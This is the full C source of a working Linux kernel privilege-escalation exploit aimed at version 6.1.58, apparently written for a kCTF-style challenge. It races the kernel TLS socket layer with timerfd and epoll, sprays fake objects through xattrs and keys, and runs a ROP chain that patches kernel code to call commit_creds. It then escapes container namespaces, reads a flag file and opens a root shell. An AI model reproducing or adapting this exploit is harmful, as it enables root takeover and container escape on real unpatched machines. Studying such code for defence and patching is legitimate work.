#define _GNU_SOURCE

#include <arpa/inet.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <netinet/in.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <time.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <assert.h>
#include <sys/inotify.h>
#include <linux/capability.h>
#include <sys/xattr.h>
#include <err.h>
#include <sys/timerfd.h>
#include <sys/epoll.h>
#include <sys/eventfd.h>
#include <pthread.h>
#include <linux/tls.h>
#include <linux/if_alg.h>
#include <netinet/tcp.h>
#include <keyutils.h>

#include "kernelver_6.1.58.h"

static char *g_mmapped_buf;
static uint64_t g_kernel_text;

uint64_t leak_kernel_text();

void set_cpu(int cpu)
{
        cpu_set_t cpus;
        CPU_ZERO(&cpus);      
        CPU_SET(cpu, &cpus);     
        if (sched_setaffinity(0, sizeof(cpu_set_t), &cpus) < 0) {
                perror("setaffinity");
                exit(1);
        }
}

void set_cpu_all()
{
        cpu_set_t cpus;
        CPU_ZERO(&cpus);      
        for (int i = 0; i < 4; i++)
        {
                CPU_SET(i, &cpus);     
        }
        if (sched_setaffinity(0, sizeof(cpu_set_t), &cpus) < 0) {
                perror("setaffinity");
                exit(1);
        }
}

void get_kctf_flag()
{
        char buf[512];


        int fd = open("/flag", O_RDONLY);

        if (fd < 0)
                return;

        size_t n = read(fd, buf, sizeof(buf));
        if (n > 0) {
                printf("Flag:\n");

                write(1, buf, n);

                printf("\n");
        }

        close(fd);
}

static char *g_sh_argv[] = {"sh", NULL};

static int g_status;

#define MMAP_SIZE 0x8000
#define XATTR_HEAD_SIZE 0x20
#define KEY_HEAD_SIZE 0x18

static int g_pwned;
static char *g_rop2;

#define ROP3_CONST_AREA 0x10
#define ROP3_CONST_OFFSET 0x200

#define KOFFSET(x) (x-0xffffffff81000000uL)
#define _STR(x) #x
#define STR(x) _STR(x)

uint64_t kaddr(uint64_t addr)
{
        return g_kernel_text + addr - 0xffffffff81000000uL;
}

void reboot()
{
        int fd = open("/proc/sysrq-trigger", O_WRONLY);
        write(fd, "b", 1);
        close(fd);
}

void __attribute__((naked)) after_pwn()
{
        g_pwned = 1;

        int pid = fork();

        if (!pid) {

        if (setns(open("/proc/1/ns/mnt", O_RDONLY), 0) < 0)
                perror("setns");

        setns(open("/proc/1/ns/pid", O_RDONLY), 0);
        setns(open("/proc/1/ns/net", O_RDONLY), 0);

        printf("\nGot root!!!\n");
        printf("Getting kctf flags ...\n");

        get_kctf_flag();

// Force reboot to avoid hangs of the repro system
        sleep(5);
        reboot();

        printf("Launching shell, system will crash when you exit because I didn't bother with recovery ...\n");
        execve("/bin/sh", g_sh_argv, NULL);
        _exit(0);
        }

        waitpid(pid, &g_status, 0);

        printf("Shell exited, sleeping for 30 seconds, after that system might crash\n");

        sleep(30);
        _exit(0);
}


void rop_rax2rdi(uint64_t **rop_p)
{
        uint64_t *rop = *rop_p;

        *(uint64_t *) (g_rop2+ROP3_CONST_OFFSET) = kaddr(POP_RDI); // RCX == RW_BUFFER 

// rax -> rdi
        *rop++ = kaddr(POP_RCX);
        *rop++ = kaddr(RW_BUFFER+ROP3_CONST_OFFSET); 
        *rop++ = kaddr(PUSH_RAX_JMP_QWORD_RCX);

        *rop_p = rop;
}

void rop_patch_kernel_code(uint64_t **rop_p, uint64_t dst, uint64_t src, size_t len)
{
        uint64_t *rop = *rop_p;
        *rop++ = kaddr(POP_RDI);
        *rop++ = dst & (~0xfff);
        *rop++ = kaddr(POP_RSI);
        *rop++ = 1;
        *rop++ = kaddr(SET_MEMORY_RW);

        *rop++ = kaddr(POP_RDI_RSI_RDX_RCX);
        *rop++ = dst;
        *rop++ = src;
        *rop++ = len;
        *rop++ = 0xdeadbeef;
        *rop++ = kaddr(COPY_USER_GENERIC_STRING);

        *rop_p = rop;
}

void __attribute__((naked)) get_root()
{
        asm volatile(
                "push %r12\n"
                "lea -(" STR(KOFFSET(SYS_KEXEC_FILE_LOAD) + 9) ")(%rip), %r12\n"
                "push %r13"
        );

// commit_creds(init_cred)
        asm volatile(
                "lea (%%r12,%0), %%rdi\n"
                "lea (%%r12,%1), %%r13\n"
                "call *%%r13\n"
                :: 
                "r" (KOFFSET(INIT_CRED)),
                "r" (KOFFSET(COMMIT_CREDS))
                : "r12", "rdi"
        );

// find_task_by_vpid(1)
        asm volatile(
                "lea (%%r12,%0), %%r13\n"
                "mov $1, %%rdi\n"
                "call *%%r13\n"
                "mov %%rax, %%rdi\n"
                :: 
                "r" (KOFFSET(FIND_TASK_BY_VPID))
                : "r12", "rdi"
        );

// switch_task_namespaces(pid, init_nsproxy)
        asm volatile(
                "lea (%%r12,%0), %%rsi\n"
                "lea (%%r12,%1), %%r13\n"
                "call *%%r13\n"
                :: 
                "r" (KOFFSET(INIT_NSPROXY)),
                "r" (KOFFSET(SWITCH_TASK_NAMESPACES))
                : "r10", "rdi"
        );

// return 0x777
        asm volatile(
                "lea (%%r12,%0), %%rcx\n"
                "pop %%r12\n"
                "pop %%r13\n"
                "mov $0x777, %%rax\n"
                "jmp *%%rcx\n"
                :: 
                "r" (KOFFSET(RETURN_THUNK))
                : "r10"
        );

}

size_t prepare_rop2(uint64_t *rop2)
{
        uint64_t *rop2_start = rop2;

        rop_patch_kernel_code(&rop2, kaddr(SYS_KEXEC_FILE_LOAD), (uint64_t) get_root, 0x200);

        *rop2++ = kaddr(INFLOOP);

        return (char *) rop2 - (char *) rop2_start;
}

void prepare_fake_ctx(char *buf)
{
// struct tls_sw_context_tx
        char *ctx = buf - 0x18;
// struct timer_list
        char *rdi = ctx + 0x50;


// blacklist: 0-0x34
// -0x20 | 1 bit issue
        *(uint64_t *) (rdi - 0x20) = 0xfffffffffffffffe;  // needed for rdx in POP_RSI_RDX_RCX gadget
/*
        0xffffffff81000cb8:     add rsp, 0x38
        0xffffffff81000cbc:     pop rbx
        0xffffffff81000cbd:     pop rbp
        0xffffffff81000cbe:     pop r12
        0xffffffff81000cc0:     jmp     __x86_return_thunk
*/
        *(uint64_t *) (rdi - 0x1a) = kaddr(0xffffffff81000cb8);

// 0xffffffff81c1fc7f: pop rsp ; jmp qword [rsi+0x66]
        *(uint64_t *) (rdi - 0x38) = kaddr(0xffffffff81c1fc7f);

/*
        0xffffffff820bbd56:     lea rbp, [rdi - 0x80]
        0xffffffff820bbd5a:     push rbx
        0xffffffff820bbd5b:     mov rbx, rdi
        0xffffffff820bbd5e:     mov rax, qword ptr [rdi + 0x68]
        0xffffffff820bbd62:     mov rdi, rbp
        0xffffffff820bbd65:     call    __x86_indirect_thunk_rax
*/
// timer->function - start of the chain
        *(uint64_t *) (rdi + 0x18) = kaddr(0xffffffff820bbd56);


// 0xffffffff81c65eb1: push   rsi ; jmp    QWORD PTR [rbp+0x48]
        *(uint64_t *) (rdi + 0x50) = kaddr(0xffffffff81c65eb1);

/*
        0xffffffff819f021b:     mov rax, qword ptr [r12 + 0x50]
        0xffffffff819f0220:     mov rsi, rbp
        0xffffffff819f0223:     mov rdi, r12
        0xffffffff819f0226:     call    __x86_indirect_thunk_rax
*/
        *(uint64_t *) (rdi + 0x68) = kaddr(0xffffffff819f021b);

        uint64_t *rop = (uint64_t *) (rdi - 0x30);

        *rop++ = kaddr(POP_RSI_RDX_RCX); // rdi - 0x30
        *rop++ = (uint64_t) g_rop2;

        rop += 2; // skip over -0x1a offset

        *rop++ = kaddr(POP_RDI_PLUS_7);  // rdi - 0x10
        *rop++ = kaddr(RW_BUFFER); // rdi - 0x8

// skip over offsets 0-0x30
        rop += 7;

        *rop++ = kaddr(COPY_USER_GENERIC_STRING);  // 0x38
        *rop++ = kaddr(POP_RSP);  // 0x40
        *rop++ = kaddr(RW_BUFFER); // 0x48
}


int alloc_xattr_fd_attr(int fd, char *attr, size_t size, void *buf)
{
        int res = fsetxattr(fd, attr, buf, size - XATTR_HEAD_SIZE, XATTR_CREATE);
        if (res < 0) {
                perror("fsetxattr");
        }

        return fd;
}

int alloc_xattr_fd(int fd, unsigned int id, size_t size, void *buf)
{
        char *attr;

        asprintf(&attr, "security.%d", id);
        alloc_xattr_fd_attr(fd, attr, size, buf);

        return fd;
}

void free_xattr_fd(int fd, int id)
{
        char *attr;

        asprintf(&attr, "security.%d", id);

        fremovexattr(fd, attr);
}

key_serial_t alloc_key(int id, size_t len, char *buf)
{
        key_serial_t serial;
        char desc[256];
        len -= KEY_HEAD_SIZE;

        snprintf(desc, sizeof(desc), "k%d", id);

        serial = syscall(SYS_add_key, "user", desc, buf, len, KEY_SPEC_PROCESS_KEYRING);

        if (serial < 0)
                err(1, "key add");

        return serial;
}

int server()
{
        int listen_sock = socket(AF_INET, SOCK_STREAM, 0);
        if (listen_sock < 0)
                err(1, "socket");

        struct sockaddr_in addr, client_addr;
        socklen_t client_addr_sz;

        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr("127.0.0.1");
        addr.sin_port = htons(7777);

        if (bind(listen_sock, &addr, sizeof(addr)) < 0)
                err(1, "bind");

        listen(listen_sock, 4096);

        return listen_sock;
}

#define DUP_CNT 1300
#define EPOLL_CNT 550

int epoll_fds[EPOLL_CNT];
int tfd_dups[DUP_CNT];

void create_watches(int fd)
{
        for (int i=0; i<DUP_CNT; i++)
        {
                tfd_dups[i] = dup(fd);

                if (tfd_dups[i] < 0)
                        err(1, "dup() failed at %d, open files limit probably too low", i);
        }

        for (int i=0; i<EPOLL_CNT; i++)
        {
                epoll_fds[i] = epoll_create1(0);

                if (epoll_fds[i] < 0)
                        err(1, "epoll_create() failed at %d, open files limit probably too low", i);
        }

        for (int i=0; i<EPOLL_CNT; i++)
        {
                for (int j=0; j<DUP_CNT; j++)
                {
                        struct epoll_event ev = { .events = EPOLLIN };

                        if (epoll_ctl(epoll_fds[i], EPOLL_CTL_ADD, tfd_dups[j], &ev) < 0)
                                err(1, "epoll_ctl");
                }
        }
}

#define NSEC_PER_SEC 1000000000UL

void ts_add(struct timespec *ts, unsigned long usecs)
{
//        printf("ts: %ld\n", usecs);
        ts->tv_nsec += usecs * 1000;

        if (ts->tv_nsec >= NSEC_PER_SEC) {
                ts->tv_sec++;
                ts->tv_nsec -= NSEC_PER_SEC;
        }
}


char *g_stack1;

struct child_arg {
        int tfd;
        int sock;
        int delay;
        int try;
};

int child_send(void *arg)
{
        struct itimerspec its = { 0 };
        struct child_arg *carg = (struct child_arg *) arg;

        set_cpu(1);

        ts_add(&its.it_value, carg->delay);

        timerfd_settime(carg->tfd, 0, &its, NULL);
        set_cpu_all();

        int ret = send(carg->sock, g_mmapped_buf, 4, MSG_DONTWAIT);

        if (ret < 0)
                perror("send");
}

#define STACK_SIZE (1024 * 1024)    /* Stack size for cloned child */

void one_attempt(int tfd, int xattr_fd, unsigned int force_delay)
{
        static unsigned int try = 0;

        alloc_xattr_fd(xattr_fd, 0, 192, g_mmapped_buf);

        int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

        if (sock < 0)
                err(1, "socket");

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));

        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr("127.0.0.1");
        addr.sin_port = htons(7777);

        if (connect(sock, &addr, sizeof(addr)) < 0)
                err(1, "connect");


        if (setsockopt(sock, SOL_TCP, TCP_ULP, "tls", sizeof("tls")) < 0)
                err(1, "setsockopt");
        
        static struct tls12_crypto_info_aes_ccm_128 crypto_info;
        crypto_info.info.version = TLS_1_2_VERSION;
        crypto_info.info.cipher_type = TLS_CIPHER_AES_CCM_128;

        set_cpu(0);

        if (setsockopt(sock, SOL_TLS, TLS_TX, &crypto_info, sizeof(crypto_info)) < 0)
                err(1, "TLS_TX");

        struct itimerspec its = { 0 };

        int delay = force_delay;

        if (!delay)
                delay = 24 + (rand() % 6);

        struct child_arg carg = {
                .tfd = tfd,
                .sock = sock,
                .try = try++,
                .delay = delay
        };

        printf("Attempt: %d delay: %d pid: %d\n", carg.try, delay, getpid());

        pid_t pid = clone(child_send, g_stack1 + STACK_SIZE, CLONE_VM | CLONE_FS | CLONE_FILES | SIGCHLD, (void *) &carg);

        usleep(50000);
        close(sock);

        usleep(1000);
        free_xattr_fd(xattr_fd, 0);

        alloc_key(0, 192, g_mmapped_buf);

        usleep(120000);

        while (1)
        {
                int status;
                int ret = waitpid(pid, &status, WNOHANG);

                if (syscall(__NR_kexec_file_load) == 0x777) {
                        printf("Privilege escalation successful!\n");
                        after_pwn();
                }

                if (ret < 0)
                        err(1, "waitpid");
                else if (ret)
                        break;
        }
}

int main(int argc, char **argv)
{
        int ret;
        struct rlimit rlim;
        unsigned int force_delay = 0;

        system("cat /proc/cpuinfo");

        if (argc > 1 && (argv[1][0] == 'f' || argv[1][0] == '0')) {
                g_kernel_text = strtoull(argv[1], NULL, 16);
        } else {
                g_kernel_text = leak_kernel_text();
        }

        if (argc > 2) {
                int num;
                if ((num = atoi(argv[2])) > 0) {
                        printf("delay: %d\n", num);
                        force_delay = num;
                }
        }

        printf("Kernel base: 0x%lx\n", g_kernel_text);

        setbuf(stdout, NULL);

        rlim.rlim_cur = rlim.rlim_max = 4096;
        if (setrlimit(RLIMIT_NOFILE, &rlim) < 0)
                err(1, "setrlimit()");

        g_mmapped_buf = mmap(NULL, MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE|MAP_LOCKED, -1, 0);
        if (g_mmapped_buf == MAP_FAILED) {
                perror("mmap");
                return 1;
        }

        memset(g_mmapped_buf, 0, MMAP_SIZE);

        struct timeval time;
        gettimeofday(&time,NULL);

        srand((time.tv_sec * 1000) + (time.tv_usec / 1000));

        set_cpu(0);

        int xattr_fd = open("/tmp/x", O_RDWR|O_CREAT);
        if (xattr_fd < 0)
                err(1, "xattr open\n");

        struct sockaddr_alg sa = {
                .salg_family = AF_ALG,
                .salg_type = "skcipher",
                .salg_name = "cryptd(ctr(aes-generic))"
        };
        int c1 = socket(AF_ALG, SOCK_SEQPACKET, 0);

        if (bind(c1, (struct sockaddr *)&sa, sizeof(sa)) < 0)
                err(1, "af_alg bind");

        struct sockaddr_alg sa2 = {
                .salg_family = AF_ALG,
                .salg_type = "aead",
                .salg_name = "ccm_base(cryptd(ctr(aes-generic)),cbcmac(aes-aesni))"
        };

        if (bind(c1, (struct sockaddr *)&sa2, sizeof(sa)) < 0)
                err(1, "af_alg bind");


        g_stack1 = mmap(NULL, STACK_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
        if (g_stack1 == MAP_FAILED) {
                perror("mmap");
                exit(1);

        }

#define ROP3_MMAP_SIZE 0x4000
        g_rop2 = mmap(NULL, ROP3_MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE|MAP_LOCKED, -1, 0);
        if (g_rop2 == MAP_FAILED)
                err(1, "mmap");

        size_t rop2_len = prepare_rop2((uint64_t *) g_rop2);
        if (rop2_len > ROP3_CONST_OFFSET)
                err(1, "Stage 2 ROP size too big: %d > %d\n", rop2_len, ROP3_CONST_OFFSET);
        

        int tfd = timerfd_create(CLOCK_MONOTONIC, 0);
        create_watches(tfd);

        prepare_fake_ctx(g_mmapped_buf);

        int listen_sock = server();

        printf("parent pid: %d\n", getpid());
        unsigned long i = 0;
        while (1)
        {       
// Instead of accepting all waiting connection just drop them by recreating the socket
                if (i++ > 4094) {
                        close(listen_sock);
                        listen_sock = server();
                }
                        
                one_attempt(tfd, xattr_fd, force_delay);
        }


        if (!g_pwned) {
                printf("Failed to trigger vuln, try again!\n");
                _exit(0);
        }

// Can't exit, everything might crash
        while (1) 
                sleep(1000);

        return 0;
}
